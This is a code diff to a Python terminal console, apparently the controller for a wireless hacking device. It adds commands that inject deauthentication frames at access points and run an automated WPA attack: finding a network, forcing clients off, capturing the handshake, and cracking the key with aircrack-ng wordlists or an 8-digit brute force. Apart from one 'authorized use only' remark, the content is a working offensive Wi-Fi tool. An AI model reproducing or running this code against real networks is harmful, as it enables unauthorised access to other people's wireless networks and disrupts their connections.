@@ -16,7 +16,8 @@ Smart console (single input box):
   :crack <pcap> [wl]     crack a local WPA handshake pcap by wordlist
   :crackdev <remote>[wl] fetch a device handshake pcap then crack it
   :deauth <bssid>[ch][n] inject deauth frames at an AP (authorized use only)
-  :attack <ssid>[wl][mask] full cycle: find→deauth→capture→crack→brute
+  :attack <ssid>[wl][brute] full cycle via aircrack-ng; brute=add 8-digit brute
+  :wordlists             list discovered wordlists + available crackers
 Keys: ctrl+r refresh status · ctrl+l clear log · ctrl+q quit
 """
 import os
@@ -263,11 +264,18 @@ class CompanionTUI(App):
                 r = await asyncio.to_thread(self.dev.deauth, parts[1], "broadcast", ch, cnt)
                 self.write_log("  " + " ".join(r.lines))
                 return
+            if text.startswith(":wordlists") or text.startswith(":tools"):
+                import crackers as ck
+                self.write_log("[b]crackers:[/b] " + ", ".join(ck.available_tools()))
+                self.write_log("[b]wordlists:[/b]")
+                for lbl, p, _sz in ck.list_wordlists():
+                    self.write_log(f"  {lbl}  [dim]{p}[/dim]")
+                return
             if text.startswith(":attack"):
-                # :attack <ssid> [wordlist] [mask]  — full cycle (find→deauth→cap→crack→brute)
+                # :attack <ssid> [wordlist] [brute]  — full cycle via aircrack-ng
                 parts = text.split()
                 if len(parts) < 2:
-                    self.write_log("[red]usage: :attack <ssid> [wordlist] [mask][/red]")
+                    self.write_log("[red]usage: :attack <ssid> [wordlist] [brute][/red]")
                     return
                 await self._attack(parts[1], parts[2] if len(parts) > 2 else "",
                                    parts[3] if len(parts) > 3 else "")
@@ -305,41 +313,51 @@ class CompanionTUI(App):
         except Exception as e:  # noqa: BLE001
             self.write_log(f"[red]deploy error:[/red] {e}")
 
+    def _resolve_wl(self, wordlist: str) -> str:
+        import crackers as ck
+        if wordlist and os.path.isfile(wordlist):
+            return wordlist
+        wls = ck.list_wordlists()
+        if wordlist:
+            for _lbl, p, _sz in wls:
+                if os.path.basename(p) == wordlist or wordlist in p:
+                    return p
+        return wls[0][1] if wls else os.path.join(WORDLIST_DIR, "common.txt")
+
     async def _crack_local(self, pcap: str, wordlist: str) -> None:
-        import wpa_crack as wcm
+        import crackers as ck
         if not os.path.isfile(pcap):
             self.write_log(f"[red]no such pcap:[/red] {pcap}")
             return
-        wl = wordlist
-        if not wl:
-            wl = os.path.join(WORDLIST_DIR, "common.txt")
-        elif not os.path.isfile(wl):
-            cand = os.path.join(WORDLIST_DIR, wl)
-            wl = cand if os.path.isfile(cand) else wl
-        self.write_log(f"[yellow]crack[/yellow] {os.path.basename(pcap)} with {os.path.basename(wl)} …")
-        res = await asyncio.to_thread(wcm.crack_file, pcap, wl, "")
-        for c in res.get("candidates", []):
-            self.write_log(f"  [dim]handshake:[/dim] {c}")
+        wl = self._resolve_wl(wordlist)
+        tool = ck.available_tools()[0]
+        bssid = ck.detect_bssid(pcap)
+        self.write_log(f"[yellow]crack[/yellow] {os.path.basename(pcap)} via [b]{tool}[/b] "
+                       f"+ {os.path.basename(wl)} (bssid {bssid or '?'}) …")
+        ev = lambda e: (self.call_from_thread(self.write_log,
+                        f"  [dim]{e.get('tested','?')} @ {e.get('rate',0):.0f}/s[/dim]")
+                        if e.get("type") == "progress" else None)
+        res = await asyncio.to_thread(ck.crack_wordlist, pcap, wl, bssid, tool, "", ev, None)
         if res.get("ok"):
-            self.write_log(f"[green]✓ KEY FOUND[/green]: [b]{res['key']}[/b]  (after {res['tried']} tries)")
+            self.write_log(f"[green]✓ KEY FOUND[/green] ({res['tool']}): [b]{res['key']}[/b]")
         else:
-            self.write_log(f"[red]✗ not found[/red] {res.get('error', '')} (tried {res.get('tried', 0)})")
+            self.write_log(f"[red]✗ not found[/red] via {res.get('tool')}")
 
-    async def _attack(self, ssid: str, wordlist: str, mask: str) -> None:
-        import wifi_attack
-        wl = wordlist
-        if not wl and not mask:
-            wl = os.path.join(WORDLIST_DIR, "common.txt")
-        elif wl and not os.path.isfile(wl):
-            cand = os.path.join(WORDLIST_DIR, wl)
-            wl = cand if os.path.isfile(cand) else wl
-        self.write_log(f"[b]WPA attack[/b] ssid={ssid} "
-                       f"wordlist={os.path.basename(wl) if wl else '-'} mask={mask or '-'}")
+    async def _attack(self, ssid: str, wordlist: str, brute_flag: str) -> None:
+        import wifi_attack, crackers as ck
+        wl = self._resolve_wl(wordlist)
+        brute = brute_flag in ("brute", "1", "true", "yes", "+")
+        tool = ck.available_tools()[0]
+        self.write_log(f"[b]WPA attack[/b] ssid={ssid} tool={tool} "
+                       f"wordlist={os.path.basename(wl)} brute={'yes' if brute else 'no'}")
+        log = lambda m: self.call_from_thread(self.write_log, "  " + str(m))
         out = await asyncio.to_thread(
-            wifi_attack.run_attack, self.dev, ssid, "", 0, wl, mask, 0, 20.0, 16, 3,
-            DL_DIR, lambda m: self.call_from_thread(self.write_log, "  " + str(m)))
+            lambda: wifi_attack.run_attack(self.dev, ssid=ssid, wordlist=wl, brute=brute,
+                                           tool=tool, capture_secs=20.0, deauth_count=16,
+                                           rounds=3, local_dir=DL_DIR, log=log))
         if out.get("ok"):
-            self.write_log(f"[green]✓ KEY FOUND[/green] via {out['method']}: [b]{out['key']}[/b]")
+            self.write_log(f"[green]✓ KEY FOUND[/green] via {out['method']}/{out.get('tool')}: "
+                           f"[b]{out['key']}[/b]")
         else:
             self.write_log(f"[red]✗ {out.get('error', 'failed')}[/red]")
 
